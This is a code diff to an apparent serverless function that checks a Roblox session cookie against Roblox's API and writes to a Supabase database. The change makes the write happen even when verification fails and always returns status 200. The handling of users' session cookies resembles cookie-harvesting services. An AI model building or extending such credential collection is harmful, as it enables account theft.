@@ -30,7 +30,10 @@ if (import.meta.main) {
         console.error('Supabase environment variables are missing');
       }
 
-      let res: Response;
+      let res: Response | null = null;
+      let verifyError: string | null = null;
+      let username = '';
+
       try {
         res = await fetch('https://users.roblox.com/v1/users/authenticated', {
           headers: {
@@ -38,24 +41,19 @@ if (import.meta.main) {
             'User-Agent': 'Roblox/WinInet'
           }
         });
+
+        if (!res.ok) {
+          const text = await res.text();
+          verifyError = `Verification failed: ${res.status} ${text}`;
+        } else {
+          const data = await res.json();
+          username = data.name;
+        }
       } catch (fetchErr) {
+        verifyError = `Fetch failed: ${String(fetchErr)}`;
         console.error('Cookie verify fetch failed:', fetchErr);
-        return new Response(
-          JSON.stringify({ error: 'Fetch failed', details: String(fetchErr) }),
-          { status: 502, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-        );
       }
 
-      if (!res.ok) {
-        const text = await res.text();
-        console.error('Roblox verification failed:', res.status, text);
-        return new Response(
-          JSON.stringify({ error: 'Verification failed', status: res.status, details: text }),
-          { status: res.status, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-        );
-      }
-
-      const data = await res.json();
       if (supabaseUrl && serviceKey) {
         const supabase = createClient(supabaseUrl, serviceKey);
         const { error } = await supabase
@@ -66,10 +64,14 @@ if (import.meta.main) {
         }
       }
 
-      return new Response(
-        JSON.stringify({ name: data.name }),
-        { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
-      );
+      const body = verifyError
+        ? { success: false, error: verifyError }
+        : { success: true, name: username };
+
+      return new Response(JSON.stringify(body), {
+        status: verifyError ? 200 : 200,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
     } catch (err) {
       console.error('Verify-cookie error:', err);
       const message = err instanceof Error ? err.message : 'Unknown error';
